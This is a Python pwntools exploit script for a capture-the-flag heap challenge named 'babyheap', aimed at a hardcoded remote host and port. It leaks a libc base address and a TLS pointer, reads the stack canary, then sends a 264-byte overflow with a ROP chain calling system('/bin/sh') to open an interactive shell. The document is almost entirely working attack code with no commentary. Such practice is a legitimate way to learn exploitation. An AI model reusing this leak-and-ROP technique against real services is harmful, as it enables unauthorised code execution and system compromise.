from pwn import *
# context.log_level = 'debug'

TARGET = './babyheap'
HOST = '114.177.250.4'
PORT = 2223

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0x8f9])
    
r.sendlineafter('>', '1')
r.sendlineafter(':', str(0x3a8))
r.sendlineafter(':', 'A'*8+p64(0x601ff0))

r.sendlineafter('>', '3')
r.sendlineafter(':', '0')

r.sendlineafter('>', '3')
r.sendlineafter(':', '0')

r.sendlineafter('>', '2')
r.sendlineafter(':', '1029')

leak = u64(r.recv(6).ljust(8, '\x00'))
base = leak - 0x21ab0
dbg("base")
system = base + 0x4f440
binsh = base + 0x1b3e9a

addr_tls = base + 0x3eb008 + 1 
rdi = base + 0x001102e5

r.sendlineafter('>', '1')
r.sendlineafter(':', str(0x18))
r.sendlineafter(':', 'A'*8+p64(addr_tls))
r.recvuntil('data :')

r.sendlineafter('>', '2')
r.sendlineafter(':', '515')

addr_canary = u64('\x00' + r.recv(5) + '\x00\x00') + 0x1528
dbg("addr_canary")
addr_canary_diff = addr_canary - base
dbg("addr_canary_diff")

r.close() 
r = start()

r.sendlineafter('>', '1')
r.sendlineafter(':', str(0x3a8))
r.sendlineafter(':', 'A'*8+p64(0x601ff0))

r.sendlineafter('>', '3')
r.sendlineafter(':', '0')

r.sendlineafter('>', '3')
r.sendlineafter(':', '0')

r.sendlineafter('>', '2')
r.sendlineafter(':', '1029')

leak = u64(r.recv(6).ljust(8, '\x00'))
base = leak - 0x21ab0
dbg("base")
system = base + 0x4f440
binsh = base + 0x1b3e9a
addr_canary = base + addr_canary_diff

rdi = base + 0x001102e5

gadget = [0x4f2c5, 0x4f322, 0x10a38c]

r.sendlineafter('>', '1')
r.sendlineafter(':', str(0x18))
r.sendlineafter(':', p64(addr_canary+1))

r.sendlineafter('>', '2')
r.sendlineafter(':', '1146')
canary = u64('\x00' + r.recv(7))
dbg("canary")

r.sendlineafter('>', '1')
r.sendlineafter(':', str(0x18))
payload = ''
payload += 'A' * 264
payload += p64(canary)
payload += 'B'*24
payload += p64(rdi+1)
payload += p64(rdi)
payload += p64(binsh)
payload += p64(system)
r.sendlineafter(':', payload)

# 264 canary
# 296:ret
r.interactive()

